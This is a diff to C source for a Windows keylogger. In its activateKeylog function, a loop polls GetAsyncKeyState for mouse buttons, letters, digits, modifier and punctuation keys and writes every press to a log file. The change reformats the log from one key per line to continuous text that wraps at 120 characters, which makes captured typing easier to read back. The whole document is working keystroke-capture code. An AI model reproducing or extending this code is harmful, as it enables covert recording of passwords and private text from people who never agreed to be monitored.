@@ -41,10 +41,14 @@ DWORD WINAPI activateKeylog(LPVOID param)
 	bool keyDown[62] = {false};
 
 	fputs("\n", fp); fflush(fp);
+
 	while (1) {
+		if(count > 120) {fputs("\n", fp); fflush(fp); count = 0;}
+
 		// Baris 1: [MOUSE1]
 		if ((GetAsyncKeyState(1) & 0x8000) && !isKeyDown(1, &keyDownStates)) {
-			fputs("[MOUSE1]\n", fp);
+			count += 8;
+			fputs("[MOUSE1]", fp);
 			fflush(fp);
 			setKeyDown(1, &keyDownStates);
 		} else if (!(GetAsyncKeyState(1) & 0x8000)) {
@@ -53,7 +57,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 2: [MOUSE2]
 		if ((GetAsyncKeyState(2) & 0x8000) && !isKeyDown(2, &keyDownStates)) {
-			fputs("[MOUSE2]\n", fp);
+			count += 8;
+			fputs("[MOUSE2]", fp);
 			fflush(fp);
 			setKeyDown(2, &keyDownStates);
 		} else if (!(GetAsyncKeyState(2) & 0x8000)) {
@@ -62,7 +67,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 3: [BACKSPACE]
 		if ((GetAsyncKeyState(8) & 0x8000) && !isKeyDown(3, &keyDownStates)) {
-			fputs("[BACKSPACE]\n", fp);
+			count += 11;
+			fputs("[BACKSPACE]", fp);
 			fflush(fp);
 			setKeyDown(3, &keyDownStates);
 		} else if (!(GetAsyncKeyState(8) & 0x8000)) {
@@ -71,7 +77,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 4: [TAB]
 		if ((GetAsyncKeyState(9) & 0x8000) && !isKeyDown(4, &keyDownStates)) {
-			fputs("[TAB]\n", fp);
+			count += 5;
+			fputs("[TAB]", fp);
 			fflush(fp);
 			setKeyDown(4, &keyDownStates);
 		} else if (!(GetAsyncKeyState(9) & 0x8000)) {
@@ -80,7 +87,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 5: [ENTER]
 		if ((GetAsyncKeyState(13) & 0x8000) && !isKeyDown(5, &keyDownStates)) {
-			fputs("[ENTER]\n", fp);
+			count += 7;
+			fputs("[ENTER]", fp);
 			fflush(fp);
 			setKeyDown(5, &keyDownStates);
 		} else if (!(GetAsyncKeyState(13) & 0x8000)) {
@@ -89,7 +97,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 6: [SHIFT]
 		if ((GetAsyncKeyState(16) & 0x8000) && !isKeyDown(6, &keyDownStates)) {
-			fputs("[SHIFT]\n", fp);
+			count += 7;
+			fputs("[SHIFT]", fp);
 			fflush(fp);
 			setKeyDown(6, &keyDownStates);
 		} else if (!(GetAsyncKeyState(16) & 0x8000)) {
@@ -98,7 +107,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 7: [CAPS]
 		if ((GetAsyncKeyState(20) & 0x8000) && !isKeyDown(7, &keyDownStates)) {
-			fputs("[CAPS]\n", fp);
+			count += 6;
+			fputs("[CAPS]", fp);
 			fflush(fp);
 			setKeyDown(7, &keyDownStates);
 		} else if (!(GetAsyncKeyState(20) & 0x8000)) {
@@ -107,7 +117,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 8: [ESC] - Digunakan juga untuk keluar dari loop
 		if ((GetAsyncKeyState(27) & 0x8000) && !isKeyDown(8, &keyDownStates)) {
-			fputs("[ESC]\n", fp);
+			count += 5;
+			fputs("[ESC]", fp);
 			fflush(fp);
 			setKeyDown(8, &keyDownStates);
 			// If ESC is pressed, exit the program
@@ -118,7 +129,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 9: [SPACE]
 		if ((GetAsyncKeyState(32) & 0x8000) && !isKeyDown(9, &keyDownStates)) {
-			fputs("[SPACE]\n", fp);
+			count += 7;
+			fputs("[SPACE]", fp);
 			fflush(fp);
 			setKeyDown(9, &keyDownStates);
 		} else if (!(GetAsyncKeyState(32) & 0x8000)) {
@@ -127,7 +139,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 10: [DEL]
 		if ((GetAsyncKeyState(46) & 0x8000) && !isKeyDown(10, &keyDownStates)) {
-			fputs("[DEL]\n", fp);
+			count += 5;
+			fputs("[DEL]", fp);
 			fflush(fp);
 			setKeyDown(10, &keyDownStates);
 		} else if (!(GetAsyncKeyState(46) & 0x8000)) {
@@ -139,7 +152,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 			int vk_code = 48 + i;
 			int index = 11 + i;
 			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index, &keyDownStates)) {
-				fprintf(fp, "[%d]\n", i);
+				count++;
+				fprintf(fp, "%d", i);
 				fflush(fp);
 				setKeyDown(index, &keyDownStates);
 			} else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
@@ -152,7 +166,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 			int vk_code = 65 + i;
 			int index = 21 + i;
 			if ((GetAsyncKeyState(vk_code) & 0x8000) && !isKeyDown(index, &keyDownStates)) {
-				fprintf(fp, "[%c]\n", (char)('A' + i));
+				count++;
+				fprintf(fp, "%c", (char)('A' + i));
 				fflush(fp);
 				setKeyDown(index, &keyDownStates);
 			} else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
@@ -162,7 +177,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 47: [MOD] - Assuming VK_LWIN/VK_RWIN (Windows Key)
 		if ((GetAsyncKeyState(91) & 0x8000) && !isKeyDown(47, &keyDownStates)) {
-			fputs("[MOD]\n", fp);
+			count += 5;
+			fputs("[MOD]", fp);
 			fflush(fp);
 			setKeyDown(47, &keyDownStates);
 		} else if (!(GetAsyncKeyState(91) & 0x8000)) {
@@ -171,14 +187,16 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 48-49: [CTRL] (VK_LCONTROL 162, VK_RCONTROL 163)
 		if ((GetAsyncKeyState(162) & 0x8000) && !isKeyDown(48, &keyDownStates)) {
-			fputs("[CTRL_LEFT]\n", fp);
+			count += 11;
+			fputs("[CTRL_LEFT]", fp);
 			fflush(fp);
 			setKeyDown(48, &keyDownStates);
 		} else if (!(GetAsyncKeyState(162) & 0x8000)) {
 			clearKeyDown(48, &keyDownStates);
 		}
 		if ((GetAsyncKeyState(163) & 0x8000) && !isKeyDown(49, &keyDownStates)) {
-			fputs("[CTRL_RIGHT]\n", fp);
+			count += 12;
+			fputs("[CTRL_RIGHT]", fp);
 			fflush(fp);
 			setKeyDown(49, &keyDownStates);
 		} else if (!(GetAsyncKeyState(163) & 0x8000)) {
@@ -187,14 +205,16 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 50-51: [ALT] (VK_LMENU 164, VK_RMENU 165)
 		if ((GetAsyncKeyState(164) & 0x8000) && !isKeyDown(50, &keyDownStates)) {
-			fputs("[ALT_LEFT]\n", fp);
+			count += 10;
+			fputs("[ALT_LEFT]", fp);
 			fflush(fp);
 			setKeyDown(50, &keyDownStates);
 		} else if (!(GetAsyncKeyState(164) & 0x8000)) {
 			clearKeyDown(50, &keyDownStates);
 		}
 		if ((GetAsyncKeyState(165) & 0x8000) && !isKeyDown(51, &keyDownStates)) {
-			fputs("[ALT_RIGHT]\n", fp);
+			count += 11;
+			fputs("[ALT_RIGHT]", fp);
 			fflush(fp);
 			setKeyDown(51, &keyDownStates);
 		} else if (!(GetAsyncKeyState(165) & 0x8000)) {
@@ -203,7 +223,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 52: [;]
 		if ((GetAsyncKeyState(186) & 0x8000) && !isKeyDown(52, &keyDownStates)) {
-			fputs("[;]\n", fp);
+			count += 3;
+			fputs("[;]", fp);
 			fflush(fp);
 			setKeyDown(52, &keyDownStates);
 		} else if (!(GetAsyncKeyState(186) & 0x8000)) {
@@ -212,7 +233,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 53: [PLUS]
 		if ((GetAsyncKeyState(187) & 0x8000) && !isKeyDown(53, &keyDownStates)) {
-			fputs("[PLUS]\n", fp);
+			count += 6;
+			fputs("[PLUS]", fp);
 			fflush(fp);
 			setKeyDown(53, &keyDownStates);
 		} else if (!(GetAsyncKeyState(187) & 0x8000)) {
@@ -221,7 +243,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 54: [,]
 		if ((GetAsyncKeyState(188) & 0x8000) && !isKeyDown(54, &keyDownStates)) {
-			fputs("[,]\n", fp);
+			count += 3;
+			fputs("[,]", fp);
 			fflush(fp);
 			setKeyDown(54, &keyDownStates);
 		} else if (!(GetAsyncKeyState(188) & 0x8000)) {
@@ -230,7 +253,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 55: [MIN]
 		if ((GetAsyncKeyState(189) & 0x8000) && !isKeyDown(55, &keyDownStates)) {
-			fputs("[MIN]\n", fp);
+			count += 5;
+			fputs("[MIN]", fp);
 			fflush(fp);
 			setKeyDown(55, &keyDownStates);
 		} else if (!(GetAsyncKeyState(189) & 0x8000)) {
@@ -239,7 +263,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 56: [.]
 		if ((GetAsyncKeyState(190) & 0x8000) && !isKeyDown(56, &keyDownStates)) {
-			fputs("[.]\n", fp);
+			count += 3;
+			fputs("[.]", fp);
 			fflush(fp);
 			setKeyDown(56, &keyDownStates);
 		} else if (!(GetAsyncKeyState(190) & 0x8000)) {
@@ -248,7 +273,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 57: [/]
 		if ((GetAsyncKeyState(191) & 0x8000) && !isKeyDown(57, &keyDownStates)) {
-			fputs("[/]\n", fp);
+			count += 3;
+			fputs("[/]", fp);
 			fflush(fp);
 			setKeyDown(57, &keyDownStates);
 		} else if (!(GetAsyncKeyState(191) & 0x8000)) {
@@ -257,7 +283,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 58: [`]
 		if ((GetAsyncKeyState(192) & 0x8000) && !isKeyDown(58, &keyDownStates)) {
-			fputs("[`]\n", fp);
+			count += 3;
+			fputs("[`]", fp);
 			fflush(fp);
 			setKeyDown(58, &keyDownStates);
 		} else if (!(GetAsyncKeyState(192) & 0x8000)) {
@@ -266,7 +293,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 59: [ [ ]
 		if ((GetAsyncKeyState(219) & 0x8000) && !isKeyDown(59, &keyDownStates)) {
-			fputs("[[ ]\n", fp);
+			count += 3;
+			fputs("[[]", fp);
 			fflush(fp);
 			setKeyDown(59, &keyDownStates);
 		} else if (!(GetAsyncKeyState(219) & 0x8000)) {
@@ -275,7 +303,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 60: [ \ ]
 		if ((GetAsyncKeyState(220) & 0x8000) && !isKeyDown(60, &keyDownStates)) {
-			fputs("[ \\ ]\n", fp);
+			count += 3;
+			fputs("[\\]", fp);
 			fflush(fp);
 			setKeyDown(60, &keyDownStates);
 		} else if (!(GetAsyncKeyState(220) & 0x8000)) {
@@ -284,7 +313,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 61: [ ] ]
 		if ((GetAsyncKeyState(221) & 0x8000) && !isKeyDown(61, &keyDownStates)) {
-			fputs("[ ] ]\n", fp);
+			count += 3;
+			fputs("[]]", fp);
 			fflush(fp);
 			setKeyDown(61, &keyDownStates);
 		} else if (!(GetAsyncKeyState(221) & 0x8000)) {
@@ -293,7 +323,8 @@ DWORD WINAPI activateKeylog(LPVOID param)
 
 		// Baris 62: [']
 		if ((GetAsyncKeyState(222) & 0x8000) && !isKeyDown(62, &keyDownStates)) {
-			fputs("[']\n", fp);
+			count += 3;
+			fputs("[']", fp);
 			fflush(fp);
 			setKeyDown(62, &keyDownStates);
 		} else if (!(GetAsyncKeyState(222) & 0x8000)) {
